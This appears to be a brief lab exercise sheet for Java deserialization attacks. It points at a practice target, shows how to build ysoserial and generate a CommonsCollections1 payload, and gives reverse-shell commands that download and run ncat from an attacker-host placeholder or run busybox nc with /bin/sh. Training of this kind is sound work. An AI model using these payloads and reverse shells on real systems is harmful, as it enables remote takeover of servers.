# Exercise 1 - Java Deserialization

Target:
http://httpwn.com:8001/

Tool:
https://github.com/frohoff/ysoserial

## Using ysoserial

Building the tool
```
git clone https://github.com/frohoff/ysoserial.git
mvn install
cd target
```

Generating CommonsCollections gadget
`java -jar ysoserial-**-all.jar CommonsCollections1 "<<YOUR COMMAND>>"`

List available gadgets
`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar`

## Simple reverse shells

```
wget http://YOUR_HOST/ncat64 -P /tmp
chmod +x /tmp/ncat64
/tmp/ncat64 -e /bin/sh YOUR_HOST 8080
```

```
busybox nc YOUR_HOST 8080 -e /bin/sh
```
